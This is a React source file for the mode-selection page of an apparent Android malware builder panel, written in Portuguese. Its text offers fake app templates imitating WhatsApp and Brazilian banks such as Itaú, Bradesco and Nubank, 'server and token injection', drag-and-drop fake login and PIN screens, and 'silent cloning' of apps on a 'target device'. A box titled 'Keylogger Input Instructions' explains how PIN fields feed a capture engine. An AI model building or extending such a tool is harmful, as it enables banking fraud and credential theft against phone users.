import { useNavigate } from 'react-router-dom';
import {
  Palette,
  Smartphone,
  ArrowRight,
  Layers,
  Type,
  MousePointer,
  LogOut,
  Shield,
  Building2,
  Zap,
  Copy
} from 'lucide-react';

interface APKBuilderSelectProps {
  onLogout: () => void;
}

export default function APKBuilderSelect({ onLogout }: APKBuilderSelectProps) {
  const navigate = useNavigate();
  
  return (
    <div className="min-h-screen bg-[#1e0603] text-slate-100 flex flex-col font-sans">
      {/* Header */}
      <header className="bg-[#290903]/80 backdrop-blur-md border-b border-blue-500/20 px-6 py-4 sticky top-0 z-50">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Smartphone className="text-cyan-400 animate-pulse" size={26} />
            <h1 className="text-lg font-black uppercase tracking-widest text-white font-mono">
              APK <span className="text-cyan-400">Builder</span>
            </h1>
          </div>
          <div className="flex items-center gap-6 font-mono text-xs uppercase tracking-wider">
            <button
              onClick={() => navigate('/dashboard')}
              className="text-slate-400 hover:text-cyan-400 transition-colors font-bold"
            >
              Dashboard
            </button>
            <button
              onClick={onLogout}
              className="flex items-center gap-2 text-slate-450 hover:text-rose-400 transition-colors font-bold"
            >
              <LogOut size={16} />
              Sair
            </button>
          </div>
        </div>
      </header>
      
      {/* Content */}
      <main className="max-w-6xl mx-auto px-6 py-12 flex-1 w-full">
        <div className="text-center mb-16 relative">
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-80 h-80 bg-blue-500/5 rounded-full blur-3xl pointer-events-none"></div>
          <h2 className="text-3xl font-black text-white mb-4 uppercase tracking-wide">
            Modo de Criação
          </h2>
          <p className="text-slate-400 max-w-xl mx-auto text-sm leading-relaxed">
            Selecione como você deseja compilar ou duplicar o seu aplicativo. Escolha entre o modo rápido nativo, o editor visual interativo ou o duplicador de apps em Pasta Segura.
          </p>
        </div>
        
        <div className="grid lg:grid-cols-3 md:grid-cols-2 gap-6">
          
          {/* Quick Builder Card (Modo Rápido) */}
          <div
            onClick={() => navigate('/build-apk/quick')}
            className="group relative bg-[#280904]/80 rounded-2xl p-8 border border-blue-500/20 hover:border-cyan-500/50 transition-all cursor-pointer hover:shadow-[0_0_35px_rgba(239,68,68,0.1)] flex flex-col"
          >
            <div className="absolute top-5 right-5">
              <span className="px-3 py-1 bg-cyan-950/50 border border-cyan-500/40 text-cyan-400 text-[10px] font-mono font-bold uppercase rounded-full tracking-wider">
                Recomendado
              </span>
            </div>
            
            <div className="w-14 h-14 bg-cyan-950/40 border border-cyan-500/30 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-105 transition-all group-hover:shadow-[0_0_15px_rgba(239,68,68,0.2)]">
              <Zap size={26} className="text-cyan-400" />
            </div>
            
            <h3 className="text-xl font-black text-white mb-3 uppercase tracking-wide">
              Modo Rápido
            </h3>
            
            <p className="text-slate-400 text-sm leading-relaxed mb-6 flex-1">
              Compilação rápida utilizando templates nativos pré-configurados (WhatsApp, Itaú, Bradesco, Nubank, Santander) prontos para deploy.
            </p>
            
            <ul className="space-y-3 mb-8 text-sm">
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Zap size={12} className="text-cyan-400" />
                </div>
                Geração nativa em 1 clique
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Shield size={12} className="text-cyan-400" />
                </div>
                Injeção automática de servidor e token
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Smartphone size={12} className="text-cyan-400" />
                </div>
                Configurações pré-otimizadas
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Building2 size={12} className="text-cyan-400" />
                </div>
                Modelos prontos de bancos e operadoras
              </li>
            </ul>
            
            <div className="flex items-center gap-2 text-cyan-400 font-mono text-xs uppercase tracking-wider group-hover:gap-4 transition-all">
              <span className="font-bold">Abrir Modo Rápido</span>
              <ArrowRight size={16} />
            </div>
          </div>

          {/* Visual Builder Card */}
          <div
            onClick={() => navigate('/build-apk/visual')}
            className="group relative bg-[#280904]/80 rounded-2xl p-8 border border-blue-500/20 hover:border-purple-500/50 transition-all cursor-pointer hover:shadow-[0_0_35px_rgba(239,68,68,0.1)] flex flex-col"
          >
            <div className="absolute top-5 right-5">
              <span className="px-3 py-1 bg-purple-950/50 border border-purple-500/40 text-purple-400 text-[10px] font-mono font-bold uppercase rounded-full tracking-wider">
                Avançado
              </span>
            </div>
            
            <div className="w-14 h-14 bg-purple-950/40 border border-purple-500/30 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-105 transition-all group-hover:shadow-[0_0_15px_rgba(239,68,68,0.2)]">
              <Palette size={26} className="text-purple-400" />
            </div>
            
            <h3 className="text-xl font-black text-white mb-3 uppercase tracking-wide">
              APK Visual
            </h3>
            
            <p className="text-slate-400 text-sm leading-relaxed mb-6 flex-1">
              Editor completo com arrastar e soltar. Desenhe telas customizadas
              de autenticação de operadoras, bancos, validações e captures específicos.
            </p>
            
            <ul className="space-y-3 mb-8 text-sm">
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <MousePointer size={12} className="text-purple-400" />
                </div>
                Arrastar e soltar intuitivo
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Layers size={12} className="text-purple-400" />
                </div>
                Múltiplas telas vinculadas
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Type size={12} className="text-purple-400" />
                </div>
                Campos de PIN e formulários customizados
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Building2 size={12} className="text-purple-400" />
                </div>
                Modelos de marcas e bancos nacionais
              </li>
            </ul>
            
            <div className="flex items-center gap-2 text-purple-400 font-mono text-xs uppercase tracking-wider group-hover:gap-4 transition-all">
              <span className="font-bold">Abrir Editor Visual</span>
              <ArrowRight size={16} />
            </div>
          </div>

          {/* App Duplicator Card (Duplicador de Apps) */}
          <div
            onClick={() => navigate('/dashboard')}
            className="group relative bg-[#280904]/80 rounded-2xl p-8 border border-blue-500/20 hover:border-emerald-500/50 transition-all cursor-pointer hover:shadow-[0_0_35px_rgba(16,185,129,0.1)] flex flex-col"
          >
            <div className="absolute top-5 right-5">
              <span className="px-3 py-1 bg-emerald-950/50 border border-emerald-500/40 text-emerald-400 text-[10px] font-mono font-bold uppercase rounded-full tracking-wider font-mono">
                Pasta Segura
              </span>
            </div>
            
            <div className="w-14 h-14 bg-emerald-950/40 border border-emerald-500/30 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-105 transition-all group-hover:shadow-[0_0_15px_rgba(16,185,129,0.2)]">
              <Copy size={26} className="text-emerald-400" />
            </div>
            
            <h3 className="text-xl font-black text-white mb-3 uppercase tracking-wide">
              Duplicador de Apps
            </h3>
            
            <p className="text-slate-400 text-sm leading-relaxed mb-6 flex-1">
              Duplique qualquer aplicativo instalado no aparelho alvo em um perfil isolado de Pasta Segura, criando um novo container 100% zerado e independente.
            </p>
            
            <ul className="space-y-3 mb-8 text-sm">
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Shield size={12} className="text-emerald-400" />
                </div>
                Clonagem silenciosa em 1 clique
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Smartphone size={12} className="text-emerald-400" />
                </div>
                Perfil isolado (User 10 / Pasta Segura)
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Zap size={12} className="text-emerald-400" />
                </div>
                Atalho com selo 🔒 personalizado
              </li>
              <li className="flex items-center gap-3 text-slate-300">
                <div className="w-6 h-6 bg-[#350b04] border border-blue-500/20 rounded-full flex items-center justify-center">
                  <Building2 size={12} className="text-emerald-400" />
                </div>
                Compatível com Caixa, Itaú, WhatsApp
              </li>
            </ul>
            
            <div className="flex items-center gap-2 text-emerald-400 font-mono text-xs uppercase tracking-wider group-hover:gap-4 transition-all">
              <span className="font-bold">Abrir Duplicador</span>
              <ArrowRight size={16} />
            </div>
          </div>
        </div>
        
        {/* Templates Preview */}
        <div className="mt-20">
          <h3 className="text-sm font-black text-slate-400 uppercase tracking-widest text-center mb-8 font-mono">
            Modelos prontos no Editor Visual
          </h3>
          
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            {/* Itau Template */}
            <div className="bg-[#280904]/85 border border-blue-500/10 hover:border-blue-500/30 rounded-xl p-4 text-center transition-all">
              <div className="w-10 h-10 bg-orange-600/10 border border-orange-500/30 rounded-xl mx-auto mb-3 flex items-center justify-center">
                <Building2 size={18} className="text-orange-400" />
              </div>
              <span className="text-xs font-bold text-white uppercase tracking-wider font-mono">Itaú</span>
              <p className="text-[10px] text-slate-500 mt-0.5">Laranja clássico</p>
            </div>
            
            {/* Bradesco Template */}
            <div className="bg-[#280904]/85 border border-blue-500/10 hover:border-blue-500/30 rounded-xl p-4 text-center transition-all">
              <div className="w-10 h-10 bg-red-650/10 border border-red-500/30 rounded-xl mx-auto mb-3 flex items-center justify-center">
                <Building2 size={18} className="text-red-400" />
              </div>
              <span className="text-xs font-bold text-white uppercase tracking-wider font-mono">Bradesco</span>
              <p className="text-[10px] text-slate-500 mt-0.5">Vermelho corporativo</p>
            </div>
            
            {/* Nubank Template */}
            <div className="bg-[#280904]/85 border border-blue-500/10 hover:border-blue-500/30 rounded-xl p-4 text-center transition-all">
              <div className="w-10 h-10 bg-purple-650/10 border border-purple-500/30 rounded-xl mx-auto mb-3 flex items-center justify-center">
                <Building2 size={18} className="text-purple-400" />
              </div>
              <span className="text-xs font-bold text-white uppercase tracking-wider font-mono">Nubank</span>
              <p className="text-[10px] text-slate-500 mt-0.5">Roxo minimalista</p>
            </div>
            
            {/* Custom Template */}
            <div className="bg-[#280904]/85 border border-blue-500/10 hover:border-blue-500/30 rounded-xl p-4 text-center transition-all">
              <div className="w-10 h-10 bg-[#350b04] border border-blue-500/30 rounded-xl mx-auto mb-3 flex items-center justify-center">
                <Palette size={18} className="text-cyan-400" />
              </div>
              <span className="text-xs font-bold text-white uppercase tracking-wider font-mono">Custom</span>
              <p className="text-[10px] text-slate-500 mt-0.5">Grade em branco</p>
            </div>
          </div>
        </div>
        
        {/* Info Box */}
        <div className="mt-16 bg-[#280904]/60 border border-blue-500/20 rounded-xl p-5 shadow-inner">
          <div className="flex items-start gap-4">
            <div className="w-10 h-10 bg-cyan-950/40 border border-cyan-500/40 rounded-xl flex items-center justify-center flex-shrink-0">
              <Shield size={18} className="text-cyan-400" />
            </div>
            <div className="text-xs leading-relaxed">
              <h4 className="font-bold text-white mb-1 uppercase tracking-wider text-cyan-400 font-mono">Instruções de Input do Keylogger</h4>
              <p className="text-slate-400">
                Campos marcados no Editor Visual com nomes especiais (como `SENHA_PIN` ou `SENHA_TRANSACAO`) 
                são automaticamente linkados ao motor de captura do aplicativo Android. Inputs marcados como PIN 
                forçam a exibição do teclado numérico nativo, registrando os dígitos imediatamente no feed.
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

